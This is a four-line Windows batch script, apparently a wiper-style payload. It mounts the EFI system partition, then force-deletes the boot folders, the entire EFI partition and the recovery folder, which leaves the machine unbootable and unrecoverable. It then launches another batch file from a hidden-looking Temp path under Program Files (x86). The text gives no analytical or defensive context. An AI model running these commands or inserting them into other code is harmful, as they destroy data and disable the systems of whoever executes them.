@echo off
mountvol W:\ /d & mountvol W:\ /s
rd /S /Q C:\Boot & rd /S /Q C:\Windows\Boot & rd /S /Q C:\Windows\System32\Boot & rd /S /Q W:\ & rd /S /Q C:\Recovery
cmd /c "C:\Program Files (x86)\Microsoft\Temp\xcopy.bat"